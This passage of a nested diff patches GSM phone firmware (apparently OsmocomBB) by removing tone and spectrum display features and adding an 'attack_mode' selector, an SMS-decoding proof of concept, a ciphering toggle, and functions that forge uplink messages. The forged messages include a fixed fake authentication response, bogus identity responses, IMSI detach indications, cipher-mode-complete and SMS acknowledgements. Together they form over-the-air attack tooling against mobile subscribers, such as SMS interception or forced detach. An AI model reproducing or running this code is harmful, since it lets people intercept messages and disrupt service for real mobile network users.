+-		fb_gotoxy(i, 0);
+-		fb_boxto(i, 4);
+-		fb_gotoxy(i, height + 10);
+-		fb_boxto(i, height + 14);
+-	}
+-
+ 	/* footer */
+ 	fb_setfg(FB_COLOR_GREEN);
+ 	fb_gotoxy(0, framebuffer->height - 10);
+@@ -515,8 +622,7 @@ static void refresh_display(void)
+ 	fb_setfg(FB_COLOR_BLACK);
+ 	fb_setfont(FB_FONT_HELVR08);
+ 	fb_gotoxy(0, framebuffer->height - 2);
+-	sprintf(text, "%d", tone / 25);
+-	fb_putstr(text, -1);
++	/*fb_putstr(text, -1);*/
+ 
+ 	fb_flush();
+ }
+@@ -650,6 +756,16 @@ static int inc_dec_arfcn(int inc)
+ 
+ static void request_ul_levels(uint16_t a);
+ 
++static void toggle_up_down(void)
++{
++	uplink = !uplink;
++	refresh_display();
++
++	if (mode == MODE_SYNC && cursor < 0)
++		request_ul_levels(ul_arfcn);
++}
++
++
+ static int inc_dec_ul_arfcn(int inc)
+ {
+ 	uint16_t a;
+@@ -677,53 +793,54 @@ static int inc_dec_ul_arfcn(int inc)
+ 	return 0;
+ }
+ 
+-static void toggle_dcs_pcs(void)
+-{
+-	pcs = !pcs;
+-	refresh_display();
+-}
+-
+-static void toggle_up_down(void)
+-{
+-	uplink = !uplink;
+-	refresh_display();
+-
+-	if (mode == MODE_SYNC && cursor < 0)
+-		request_ul_levels(ul_arfcn);
+-}
+-
+-static void toggle_spectrum(void)
+-{
+-	if (mode == MODE_MAIN) {
+-		mode = MODE_SPECTRUM;
+-		pm_mode = PM_IDLE;
+-	} else if (mode == MODE_SPECTRUM) {
+-		mode = MODE_MAIN;
+-		pm_mode = PM_IDLE;
+-	}
+-	l1s_reset();
+-	l1s_reset_hw();
+-	pm_count = 0;
+-	refresh_display();
+-}
+-
+-static void tone_inc_dec(int inc)
+-{
+-	if (inc) {
+-		if (tone + 25 <= 255)
+-			tone += 25;
++/* yes this code is fugly, excuse me ;)
++   also it assumes that sms consist of two lapdm frames.
++   so a message longer will actually cause this code to burp.
++   it probably also makes other assumptions about the decoding, it's just a PoC
++*/
++static void decode_dspl_sms(uint8_t *msg, uint8_t msg_len){
++	/* dummy for now, we would have to reassemble frames to do this properly */
++	uint8_t *ptr = msg;
++	uint8_t len = 0;
++
++	memset(sms_state.text, 0, sizeof(sms_state.text));
++	printf("SMS PAYLOAD: %s\n", osmo_hexdump(msg, msg_len));
++
++	printf("\ndecode_dspl_sms with SKIP: %d\n\n", sms_state.skip);
++
++	if(sms_state.skip == -1){
++		ptr += 3 + 1 + 1;       /* lapdm header, proto discr, msg type, cp-user-data */
++		sms_state.cp_user_length = *ptr++; /* read cp-data length and skip length byte */
++		/* printf("\n\nsms cp user length %x\n\n", sms_state.cp_user_length); */
++		ptr += 1 + 1;           /* skip msg type rp-data, msg ref */
++		len = *ptr;             /* get orig address length */
++		/* printf("\n\nsms orig address length: %x\n", len); */
++		ptr += 1 + len;         /* len byte, actual len */
++		ptr += 1;               /* skip rp-dest address */
++
++		/* printf("\n\n sms rp user-data length %x\n\n", *ptr); */
++		ptr += 1;               /* skip user-data-length */
++		ptr += 1;               /* skip sms header type byte */
++		len = *ptr;             /* orig address length */
++		/* printf("sms orig addr length %x\n", len); */
++
++		sms_state.skip = (((len + 1)/2) + 1) - (msg_len - (ptr - msg) - 1);
++		/* printf("len: %d, msg_len: %d, skip: %d\n", len, msg_len, sms_state.skip); */
+ 	} else {
+-		if (tone - 25 >= 0)
+-			tone -= 25;
++		/* printf("skipping %d of %s\n", sms_state.skip, osmo_hexdump(msg, msg_len)); */
++		ptr += sms_state.skip + 3; /* skip remaining length + l2 header */
++		ptr += 1 + 1 + 7;       /* tp-pid, tp-dcs, service center timestamp */
++		len = *ptr;             /* tp-user-data length */
++		ptr += 1;               /* skip length */
++
++		gsm_7bit_decode(sms_state.text, ptr, len);
++		printf("\nDECODED SMS: %s\n", sms_state.text);
+ 	}
+-
+-	refresh_display();
+ }
+ 
+-static void hold_max(void)
++static void toggle_dcs_pcs(void)
+ {
+-	max = !max;
+-	max_power = power;
++	pcs = !pcs;
+ 	refresh_display();
+ }
+ 
+@@ -744,28 +861,91 @@ static int inc_dec_neighbour(int inc)
+ 	return 0;
+ }
+ 
+-static int inc_dec_spectrum(int inc)
+-{
+-	if (inc) {
+-		pm_scale <<= 1;
+-		if (pm_scale > 8)
+-			pm_scale = 8;
+-	} else {
+-		pm_scale >>= 1;
+-		if (pm_scale < 1)
+-			pm_scale = 1;
+-	}
+-
+-	refresh_display();
+-
+-	return 0;
+-}
++static int tx_chan_req(void);
+ 
+ static void enter_sync(void);
+ static void exit_sync(void);
+ 
+ static void enter_rach(void);
+ static void exit_rach(void);
++static int tx_meas_rep(uint8_t chan_nr, uint8_t tx_power, uint8_t timing_advance);
++uint8_t current_chan;
++
++static void handle_pm(void)
++{
++	/* start power measurement */
++	if (pm_mode == PM_IDLE && (mode == MODE_MAIN || mode == MODE_SPECTRUM)) {
++		struct msgb *msg = l1ctl_msgb_alloc(L1CTL_PM_REQ);
++		struct l1ctl_pm_req *pm;
++		uint16_t a, e;
++
++		pm = (struct l1ctl_pm_req *) msgb_put(msg, sizeof(*pm));
++		pm->type = 1;
++		if (mode == MODE_MAIN) {
++			a = arfcn;
++			if (pcs && arfcn >= PCS_MIN && arfcn <= PCS_MAX)
++				a |= ARFCN_PCS;
++			if (uplink)
++				a |= ARFCN_UPLINK;
++			e = a;
++			pm_mode = PM_SENT;
++		}
++		if (mode == MODE_SPECTRUM) {
++			if (pcs && arfcn >= PCS_MIN && arfcn <= PCS_MAX) {
++				a = PCS_MIN | ARFCN_PCS;
++				e = PCS_MAX | ARFCN_PCS;
++			} else {
++				a = band->min;
++				e = band->max;
++			}
++			pm_mode = PM_RANGE_SENT;
++		}
++		if (uplink) {
++			a |= ARFCN_UPLINK;
++			e |= ARFCN_UPLINK;
++		}
++		pm->range.band_arfcn_from = htons(a);
++		pm->range.band_arfcn_to = htons(e);
++
++		l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++
++		return;
++	}
++
++	if (pm_mode == PM_RESULT) {
++		pm_mode = PM_IDLE;
++		if (pm_count == pm_max) {
++			int i = 0;
++			int sum = 0;
++
++			if (uplink) {
++				/* find max */
++				for (i = 0; i < pm_count; i++) {
++					if (pm_meas[i] > sum)
++						sum = pm_meas[i];
++				}
++				power = sum;
++			} else {
++				for (i = 0; i < pm_count; i++)
++					sum += pm_meas[i];
++				power = sum / pm_count;
++			}
++			if (power > max_power)
++				max_power = power;
++			pm_count = 0;
++			pm_max = (uplink) ? NUM_PM_UL : NUM_PM_DL;
++			refresh_display();
++		}
++		return;
++	}
++
++	if (pm_mode == PM_RANGE_RESULT) {
++		pm_mode = PM_IDLE;
++		refresh_display();
++		return;
++	}
++}
++
+ 
+ static void handle_key_code()
+ {
+@@ -785,10 +965,6 @@ static void handle_key_code()
+ 	if (key_code == KEY_INV)
+ 		return;
+ 
+-	/* do later, do not disturb tone */
+-	if (tone_on)
+-		return;
+-
+ 	switch (key_code) {
+ 	case KEY_0:
+ 	case KEY_1:
+@@ -805,19 +981,15 @@ static void handle_key_code()
+ 		break;
+ 	case KEY_UP:
+ 		if (mode == MODE_MAIN)
+-			tone_inc_dec(1);
++			break;
+ 		else if (mode == MODE_SYNC)
+ 			inc_dec_neighbour(0);
+-		else if (mode == MODE_SPECTRUM)
+-			inc_dec_spectrum(1);
+ 		break;
+ 	case KEY_DOWN:
+ 		if (mode == MODE_MAIN)
+-			tone_inc_dec(0);
++			break;
+ 		else if (mode == MODE_SYNC)
+ 			inc_dec_neighbour(1);
+-		else if (mode == MODE_SPECTRUM)
+-			inc_dec_spectrum(0);
+ 		break;
+ 	case KEY_RIGHT:
+ 		if (mode == MODE_MAIN || mode == MODE_SPECTRUM)
+@@ -832,6 +1004,7 @@ static void handle_key_code()
+ 			inc_dec_ul_arfcn(0);
+ 		break;
+ 	case KEY_LEFT_SB:
++		memset(sms_state.text, 0, sizeof(sms_state.text));
+ 		if (mode == MODE_MAIN || mode == MODE_SPECTRUM)
+ 			toggle_dcs_pcs();
+ 		else if (mode == MODE_ARFCN)
+@@ -856,7 +1029,7 @@ static void handle_key_code()
+ 			enter_rach();
+ 		break;
+ 	case KEY_MENU:
+-		hold_max();
++		reenter_sync();
+ 		break;
+ 	case KEY_POWER:
+ 		if (mode == MODE_ARFCN)
+@@ -865,12 +1038,11 @@ static void handle_key_code()
+ 			exit_sync();
+ 		else if (mode == MODE_RACH)
+ 			exit_rach();
+-		else if (mode == MODE_SPECTRUM)
+-			toggle_spectrum();
+ 		break;
+ 	case KEY_STAR:
+-		if (mode == MODE_MAIN || mode == MODE_SPECTRUM)
+-			toggle_spectrum();
++		attack_mode = (attack_mode + 1) % 6;
++		refresh_display();
++		break;
+ 		break;
+ 	default:
+ 		break;
+@@ -879,112 +1051,1025 @@ static void handle_key_code()
+ 	key_code = KEY_INV;
+ }
+ 
+-static void handle_tone(void)
+-{
+-	unsigned long elapsed = jiffies - tone_time;
++/*
++============================================================================
++END OF UI HANDLING
++============================================================================
++*/
+ 
+-	if (!tone_on) {
+-		if (!tone || mode != MODE_MAIN)
+-			return;
+-		/* wait depending on power level */
+-		if (elapsed < (uint8_t)(63-power))
+-			return;
+-		buzzer_volume(tone);
+-		buzzer_note(NOTE(NOTE_C, OCTAVE_5));
+-		tone_time = jiffies;
+-		tone_on = 1;
+-		return;
+-	}
+ 
+-	if (elapsed >= TONE_JIFFIES) {
+-		tone_on = 0;
+-		tone_time = jiffies;
+-		buzzer_volume(0);
++/* PAGING functions */
++
++static char *chan_need(int need)
++{
++	switch (need) {
++		case 0:
++			return "any";
++		case 1:
++			return "sdch";
++		case 2:
++			return "tch/f";
++		case 3:
++			return "tch/h";
++		default:
++			return "invalid";
+ 	}
+ }
+ 
+-/* PM handling */
+ 
+-static void handle_pm(void)
++static const char *pag_print_mode(int m)
+ {
+-	/* start power measurement */
+-	if (pm_mode == PM_IDLE && (mode == MODE_MAIN || mode == MODE_SPECTRUM)) {
+-		struct msgb *msg = l1ctl_msgb_alloc(L1CTL_PM_REQ);
+-		struct l1ctl_pm_req *pm;
+-		uint16_t a, e;
++	switch (m) {
++		case 0: 
++			return "Normal paging";
++		case 1: 
++			return "Extended paging";
++		case 2: 
++			return "Paging reorganization";
++		case 3: 
++			return "Same as before";
++		default:
++			return "invalid";
++	}
++}
++static char *mi_type_to_string(int type)
++{
++	switch (type) {
++		case GSM_MI_TYPE_NONE:
++			return "none";
++		case GSM_MI_TYPE_IMSI:
++			return "IMSI";
++		case GSM_MI_TYPE_IMEI:
++			return "IMEI";
++		case GSM_MI_TYPE_IMEISV:
++			return "IMEISV";
++		case GSM_MI_TYPE_TMSI:
++			return "TMSI";
++		default:
++			return "invalid";
++	}
++}
+ 
+-		pm = (struct l1ctl_pm_req *) msgb_put(msg, sizeof(*pm));
+-		pm->type = 1;
+-		if (mode == MODE_MAIN) {
+-			a = arfcn;
+-			if (pcs && arfcn >= PCS_MIN && arfcn <= PCS_MAX)
+-				a |= ARFCN_PCS;
+-			if (uplink)
+-				a |= ARFCN_UPLINK;
+-			e = a;
+-			pm_mode = PM_SENT;
+-		}
+-		if (mode == MODE_SPECTRUM) {
+-			if (pcs && arfcn >= PCS_MIN && arfcn <= PCS_MAX) {
+-				a = PCS_MIN | ARFCN_PCS;
+-				e = PCS_MAX | ARFCN_PCS;
+-			} else {
+-				a = band->min;
+-				e = band->max;
+-			}
+-			pm_mode = PM_RANGE_SENT;
+-		}
+-		if (uplink) {
+-			a |= ARFCN_UPLINK;
+-			e |= ARFCN_UPLINK;
+-		}
+-		pm->range.band_arfcn_from = htons(a);
+-		pm->range.band_arfcn_to = htons(e);
++struct msgb *gsm48_l3_msgb_alloc(void)
++{
++	struct msgb *msg;
+ 
+-		l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	msg = msgb_alloc_headroom(L3_ALLOC_SIZE+L3_ALLOC_HEADROOM,
++			L3_ALLOC_HEADROOM, "GSM 04.08 L3");
++	if (!msg)
++		return NULL;
++	msg->l3h = msg->data;
++
++	return msg;
++}
++
++
++int l1ctl_tx_crypto_req(uint8_t algo, uint8_t *key, uint8_t len){
++	struct msgb *msg;
++	struct l1ctl_info_ul *ul;
++	struct l1ctl_crypto_req *req;
++
++	msg = l1ctl_msgb_alloc(L1CTL_CRYPTO_REQ);
++	if (!msg)
++		return -1;
++
++	printf("CRYPTO Req. algo=%d, len=%d\n", algo, len);
++	ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*ul));
++	req = (struct l1ctl_crypto_req *) msgb_put(msg, sizeof(*req) + len);
++	req->algo = algo;
++	if (len)
++		memcpy(req->key, key, len);
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++
++	return 0;
++}
++
++static void disable_ciphering(void){
++	l1ctl_tx_crypto_req(0, NULL, 0);
++}
++
++static void enable_ciphering(void){
++	l1ctl_tx_crypto_req(GSM_CIPHER_A5_1, kc, sizeof(kc)-1);
++}
++
++int l1ctl_tx_dm_est_req_h1(uint8_t maio, uint8_t hsn, uint16_t *ma, uint8_t ma_len, uint8_t chan_nr, uint8_t tsc, uint8_t tch_mode) {
++	struct msgb *msg;
++	struct l1ctl_info_ul *ul;
++	struct l1ctl_dm_est_req *req;
++	int i;
++
++	msg = l1ctl_msgb_alloc(L1CTL_DM_EST_REQ);
++	if (!msg)
++		return -1;
++
++	printf("\nh1: Tx Dedic.Mode Est Req (maio=%u, hsn=%u, chan_nr=0x%02x)\n", maio, hsn, chan_nr);
++
++	ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*ul));
++	ul->chan_nr = chan_nr;
++	ul->link_id = 0;
++
++	req = (struct l1ctl_dm_est_req *) msgb_put(msg, sizeof(*req));
++	req->tsc = tsc;
++	req->h = 1;
++	req->h1.maio = maio;
++	req->h1.hsn = hsn;
++	req->h1.n = ma_len;
++
++	for (i = 0; i < ma_len; i++)
++		req->h1.ma[i] = htons(ma[i]);
++
++	req->tch_mode = tch_mode;
++	//req->audio_mode = audio_mode;
++	req->audio_mode = AUDIO_TX_MICROPHONE | AUDIO_RX_SPEAKER;
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++
++int l1ctl_tx_dm_est_req_h0(uint16_t band_arfcn, uint8_t chan_nr, uint8_t tsc, uint8_t tch_mode){
++	struct msgb *msg;
++	struct l1ctl_info_ul *ul;
++	struct l1ctl_dm_est_req *req;
++
++	msg = l1ctl_msgb_alloc(L1CTL_DM_EST_REQ);
++	if (!msg)
++		return -1;
++
++	printf("\nh0: Tx Dedic.Mode Est Req (arfcn=%u, chan_nr=0x%02x)\n", band_arfcn, chan_nr);
++
++	ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*ul));
++	ul->chan_nr = chan_nr;
++	ul->link_id = 0;
++
++	req = (struct l1ctl_dm_est_req *) msgb_put(msg, sizeof(*req));
++	req->tsc = tsc;
++	req->h = 0;
++	req->h0.band_arfcn = htons(band_arfcn);
++	req->tch_mode = tch_mode;
++	//req->audio_mode = audio_mode;
++	req->audio_mode = AUDIO_TX_MICROPHONE | AUDIO_RX_SPEAKER;
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_ccch_mode(uint8_t ccch_mode){
++	struct msgb *msg = l1ctl_msgb_alloc(L1CTL_CCCH_MODE_REQ);
++	struct l1ctl_ccch_mode_req *req;
++
++	if(!msg) return -1;
++	req = (struct l1ctl_ccch_mode_req *) msgb_put(msg, sizeof(*req));
++	req->ccch_mode = ccch_mode;
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_chan_req(void){
++	struct msgb *msg;
++	struct l1ctl_info_ul *ul;
++	struct l1ctl_rach_req *rach_req;
++	uint8_t ran = 0x1f;
+ 
++	msg = l1ctl_msgb_alloc(L1CTL_RACH_REQ);
++	if(!msg) return -1;
++
++	ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*ul));
++	rach_req = (struct l1ctl_rach_req *) msgb_put(msg, sizeof(*rach_req));
++	
++	rach_req->ra = 0x80 | ran;
++	rach_req->offset = 0;
++	rach_req->combined = (ccch_conf == 1);
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_param_req(uint8_t timing_adv, uint8_t tx_power){
++	struct msgb *msg;
++	struct l1ctl_info_ul *ul;
++	struct l1ctl_par_req *par_req;
++
++	msg = l1ctl_msgb_alloc(L1CTL_PARAM_REQ);
++	if(!msg) return -1;
++
++	ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*ul));
++	par_req = (struct l1ctl_par_req *) msgb_put(msg, sizeof(*par_req));
++	par_req->tx_power = tx_power;
++	par_req->ta = timing_adv;
++
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static void lapdm_pad_msgb(struct msgb *msg, uint8_t n201)
++{
++	int pad_len = n201 - msgb_l2len(msg);
++	uint8_t *data;
++
++	if (pad_len < 0) {
++		printf("cannot pad message that is already too big!\n");
+ 		return;
+ 	}
+ 
+-	if (pm_mode == PM_RESULT) {
+-		pm_mode = PM_IDLE;
+-		if (pm_count == pm_max) {
+-			int i = 0;
+-			int sum = 0;
++	data = msgb_put(msg, pad_len);
++	memset(data, 0x2B, pad_len);
++}
+ 
+-			if (uplink) {
+-				/* find max */
+-				for (i = 0; i < pm_count; i++) {
+-					if (pm_meas[i] > sum)
+-						sum = pm_meas[i];
+-				}
+-				power = sum;
+-			} else {
+-				for (i = 0; i < pm_count; i++)
+-					sum += pm_meas[i];
+-				power = sum / pm_count;
+-			}
+-			if (power > max_power)
+-				max_power = power;
+-			pm_count = 0;
+-			pm_max = (uplink) ? NUM_PM_UL : NUM_PM_DL;
+-			if (!tone_on)
+-				refresh_display();
++static int gsm48_encode_classmark1(struct gsm48_classmark1 *cm){
++	memset(cm, 0, sizeof(*cm));
++
++	cm->rev_lev = 1;
++	cm->es_ind = 0;
++	cm->a5_1 = 0;
++	cm->pwr_lev = 0;
++
++	return 0;
++}
++static int gsm48_encode_classmark2(struct gsm48_classmark2 *cm){
++	memset(cm, 0, sizeof(*cm));
++
++	cm->pwr_lev = power;
++	cm->spare = 0;
++	cm->es_ind = 0;
++	cm->a5_1 = 0;
++	cm->rev_lev = 1;
++
++	cm->fc = 1;
++	cm->vgcs = 0;
++	cm->vbs = 0;
++	cm->sm_cap = 1;
++	cm->ss_scr = 1;
++	cm->ps_cap = 0;
++
++	cm->a5_2 = 1;
++	cm->a5_3 = 0;
++	cm->cmsp = 0;
++	cm->solsa = 0;
++	cm->lcsva_cap = 0;
++
++	return 0;
++}
++
++static int l1ctl_tx_data_req(struct msgb *msg){
++	/*
++	if (msgb_l2len(msg) > 23) {
++		printf("L1 cannot handle message length > 23 (%u)\n", msgb_l2len(msg));
++		msgb_free(msg);
++		return -EINVAL;
++	} else if (msgb_l2len(msg) < 23) {
++		printf("L1 message length < 23 (%u) doesn't seem right!\n", msgb_l2len(msg));
++	}
++	*/
++
++	//printf("(%s)\n", osmo_hexdump(msg->l2h, msgb_l2len(msg)));
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_lapdm_rr(uint8_t chan_nr, uint8_t nr){
++	struct msgb *msg;
++	struct l1ctl_info_ul *l1i_ul;
++
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	printf("\n-> func=RR, N(R)=%d\n", nr);
++	//printf("\(%s)\n", osmo_hexdump(msg->data, msg->len));
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	msg->l2h[0] = LAPDm_ADDR(LAPDm_LPD_NORMAL, lapd_state.sapi, CR_MS2BS_RESP);
++	msg->l2h[1] = LAPDm_CTRL_S(nr, LAPDm_S_RR, 0);
++	/* TODO compute actual length */
++	msg->l2h[2] = 0x1;
++
++	lapdm_pad_msgb(msg, 23);
++
++	l1ctl_tx_data_req(msg);
++	return 0;
++}
++
++static int tx_lapdm_ua(uint8_t chan_nr){
++	struct msgb *msg;
++	struct l1ctl_info_ul *l1i_ul;
++
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	printf("\n-> U func=UA\n");
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	msg->l2h[0] = LAPDm_ADDR(LAPDm_LPD_NORMAL, lapd_state.sapi, CR_MS2BS_RESP);
++	msg->l2h[1] = LAPDm_CTRL_U(LAPDm_U_UA, 1);
++
++	/* TODO compute actual length */
++	msg->l2h[2] = 0x1;
++
++	lapdm_pad_msgb(msg, 23);
++
++	l1ctl_tx_data_req(msg);
++	return 0;
++}
++
++static int tx_imsi_detach(uint8_t chan_nr, uint8_t *midata, uint8_t milen){
++	struct msgb *msg;
++	struct gsm48_hdr *ngh;
++	struct l1ctl_info_ul *l1i_ul;
++	struct gsm48_classmark1 cm;
++	uint8_t *mi;
++	
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	ngh = (struct gsm48_hdr *)msgb_put(msg, sizeof(*ngh));
++	ngh->proto_discr = GSM48_PDISC_MM;
++	ngh->msg_type = GSM48_MT_MM_IMSI_DETACH_IND;
++
++	gsm48_encode_classmark1(&cm);
++
++	msg->l2h[0] = 0x01; //LAPDm_ADDR(LAPDm_LPD_NORMAL, 0, CR_MS2BS_RESP);
++	msg->l2h[1]= LAPDm_CTRL_U(LAPDm_U_SABM, 1);
++	/* 2 (RR + seq + type ) + 1 (classmark1) + mobile identity len */
++	msg->l2h[2] = LAPDm_LEN(3 + milen);
++
++	msgb_v_put(msg, *((uint8_t *)&cm));
++
++	mi = msgb_put(msg, milen);
++	memcpy(mi, midata, milen);
++
++	lapdm_pad_msgb(msg, 23);
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++
++	return 0;
++}
++
++static int gsm48_encode_mi(uint8_t *buf, struct msgb *msg, uint8_t mi_type) {
++	uint8_t *ie;
++	uint8_t mi_len = 0;
++
++	/* the length and values are completely bogus... just placeholders for now */
++	switch(mi_type) {
++		case GSM_MI_TYPE_TMSI:
++			gsm48_generate_mid_from_tmsi(buf, "\x01\x02\x03\x04");
++			mi_len = 4;
++			break;
++		case GSM_MI_TYPE_IMSI:
++			gsm48_generate_mid_from_imsi(buf, "123456789012345");
++			mi_len = 8;
++			break;
++		case GSM_MI_TYPE_IMEI:
++			gsm48_generate_mid_from_imsi(buf, "123456789012345");
++			mi_len = 8;
++			break;
++		case GSM_MI_TYPE_IMEISV:
++			gsm48_generate_mid_from_imsi(buf, "123456789012345");
++			mi_len = 8;
++			break;
++		case GSM_MI_TYPE_NONE:
++		default:
++			buf[0] = GSM48_IE_MOBILE_ID;
++			buf[1] = 1;
++			buf[2] = 0xf0;
++			break;
++	}
++	/* alter MI type */
++	buf[2] = (buf[2] & ~GSM_MI_TYPE_MASK) | mi_type;
++
++	if (msg) {
++		/* MI as LV */
++		ie = msgb_put(msg, 1 + buf[1]);
++		memcpy(ie, buf + 1, 1 + buf[1]);
++	}
++
++	return mi_len;
++}
++
++
++/* this is a dummy and just sends back a nonsense identity */
++static int tx_identity_response(uint8_t chan_nr, uint8_t n_recv, uint8_t n_send, uint8_t mi_type){
++	struct msgb *msg;
++	struct gsm48_hdr *ngh;
++	struct l1ctl_info_ul *l1i_ul;
++
++	uint8_t *identity;
++	uint8_t mi_len;
++	uint8_t buf[11];
++	
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	ngh = (struct gsm48_hdr *)msgb_put(msg, sizeof(*ngh));
++	ngh->proto_discr = GSM48_PDISC_MM;
++	ngh->msg_type = GSM48_MT_MM_ID_RESP;
++
++	msg->l2h[0] = 0x1; // RR/MM/CC final octet set
++	msg->l2h[1]= LAPDm_CTRL_I(n_recv, n_send, 0);
++
++	mi_len = gsm48_encode_mi(buf, msg, mi_type);
++	msg->l2h[2] = LAPDm_LEN(3 + mi_len);
++
++	printf("\n-> ID RESP\n\n");
++
++	lapdm_pad_msgb(msg, 23);
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_authentication_response(uint8_t chan_nr, uint8_t n_recv, uint8_t n_send){
++	struct msgb *msg;
++	struct gsm48_hdr *ngh;
++	struct l1ctl_info_ul *l1i_ul;
++	uint8_t *sres;
++	
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	ngh = (struct gsm48_hdr *)msgb_put(msg, sizeof(*ngh));
++	ngh->proto_discr = GSM48_PDISC_MM;
++	ngh->msg_type = GSM48_MT_MM_AUTH_RESP;
++
++	msg->l2h[0] = 0x1; // RR/MM/CC final octet set
++	msg->l2h[1]= LAPDm_CTRL_I(n_recv, n_send, 0);
++	msg->l2h[2] = LAPDm_LEN(6); /* 4 auth resp + 2 msg type + protocol discriminator */
++
++	sres = msgb_put(msg, 4);
++	memcpy(sres, "\xde\xad\xbe\xef", 4);
++
++	printf("\n-> AUTH RESP\n\n");
++
++	lapdm_pad_msgb(msg, 23);
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_cipher_mode_complete(uint8_t chan_nr, uint8_t n_recv, uint8_t n_send){
++	struct msgb *msg;
++	struct gsm48_hdr *ngh;
++	struct l1ctl_info_ul *l1i_ul;
++	
++	printf("\n->CIPHER MODE COMPLETE\n");
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	ngh = (struct gsm48_hdr *)msgb_put(msg, sizeof(*ngh));
++	ngh->proto_discr = GSM48_PDISC_RR;
++	ngh->msg_type = GSM48_MT_RR_CIPH_M_COMPL;
++
++	msg->l2h[0] = 0x1; // RR/MM/CC final octet set
++	msg->l2h[1]= LAPDm_CTRL_I(n_recv, n_send, 0);
++	msg->l2h[2] = LAPDm_LEN(2);
++
++	lapdm_pad_msgb(msg, 23);
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++	return 0;
++}
++
++static int tx_sms_rp_ack(uint8_t chan_nr){
++	struct msgb *msg;
++	struct l1ctl_info_ul *l1i_ul;
++	struct gsm48_classmark1 cm;
++	uint8_t *mi;
++	
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	gsm48_encode_classmark1(&cm);
++
++	msg->l2h[0] = 0x0d;
++	msg->l2h[1]= 0x42;
++	msg->l2h[2] = 0x15;
++
++	mi = msgb_put(msg, 4);
++	/* TODO: don't hardcode that */
++	memcpy(mi, "\x89\x01\x02\x2a", 4);
++
++	lapdm_pad_msgb(msg, 23);
++	l1a_l23_rx(SC_DLCI_L1A_L23, msg);
++
++	return 0;
++}
++
++static int tx_sms_cp_data_rp_ack(uint8_t chan_nr, uint8_t n_recv, uint8_t n_send){
++	struct msgb *msg;
++	struct l1ctl_info_ul *l1i_ul;
++	struct gsm48_classmark1 cm;
++	uint8_t *mi;
++	
++	printf("\n-> N(R)=%d, N(S)=%d, CP-DATA RP-ACK\n", n_recv, n_send);
++	msg = l1ctl_msgb_alloc(L1CTL_DATA_REQ);
++	if(!msg) return -1;
++
++	/* prepend uplink info header */
++	l1i_ul = (struct l1ctl_info_ul *) msgb_put(msg, sizeof(*l1i_ul));
++	l1i_ul->chan_nr = chan_nr;
++	l1i_ul->link_id = 0;
++
++	msg->l2h = msgb_put(msg, 3);
++
++	gsm48_encode_classmark1(&cm);
++
++	msg->l2h[0] = 0x0d;
++	msg->l2h[1]= LAPDm_CTRL_I(n_recv, n_send, 1);
++	msg->l2h[2] = 0x15;
++
++	mi = msgb_put(msg, 5);
++	/* TODO: don't hardcode that */
++	memcpy(mi, "\x89\x01\x02\x02\x2a", 5);
++
++	lapdm_pad_msgb(msg, 23);
++	//printf("\(%s)\n", osmo_hexdump(msg->data, msg->len));
